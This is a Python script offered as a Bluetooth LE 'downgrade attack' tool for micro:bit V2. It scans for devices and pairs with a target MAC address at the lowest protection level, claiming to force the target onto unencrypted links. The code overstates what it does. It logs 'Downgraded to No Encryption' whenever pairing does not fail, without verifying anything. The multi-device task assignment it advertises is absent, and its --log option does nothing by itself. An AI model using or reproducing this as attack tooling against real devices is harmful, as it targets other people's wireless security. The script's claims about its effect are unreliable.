# microbit_ble_downgrade_attack.py

"""
BLE Downgrade Attack for micro:bit V2 (Multi-Device Support)

This script forces BLE devices to downgrade to insecure encryption levels.
- Detects available micro:bit devices and assigns tasks dynamically
- Forces downgrade of BLE security (`--downgrade <target_mac>`)
- Logs device responses for analysis (`--log <file>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Perform a BLE security downgrade attack:
   ```sh
   python microbit_ble_downgrade_attack.py --downgrade AA:BB:CC:DD:EE:FF
   ```

2. Log downgraded device responses:
   ```sh
   python microbit_ble_downgrade_attack.py --log downgrade_log.txt
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import datetime
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Security Downgrade Attack
async def ble_downgrade(target_mac, log_file):
    """Forces BLE devices to downgrade encryption levels."""
    print(f"[+] Attempting BLE security downgrade on {target_mac}...")
    async with BleakClient(target_mac) as client:
        try:
            await client.pair(protection_level=0)  # Force lowest security level
            timestamp = datetime.datetime.now().isoformat()
            log_entry = f"{timestamp} | {target_mac} | Downgraded to No Encryption\n"
            print(f"[+] {log_entry}")
            if log_file:
                with open(log_file, "a") as f:
                    f.write(log_entry)
        except Exception as e:
            print(f"[-] Downgrade attack failed: {e}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Downgrade Attack for micro:bit V2")
    parser.add_argument("--downgrade", metavar="target_mac", help="Force downgrade of BLE security levels")
    parser.add_argument("--log", metavar="file", help="Log device responses for analysis")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.downgrade:
        loop.run_until_complete(ble_downgrade(args.downgrade, args.log))
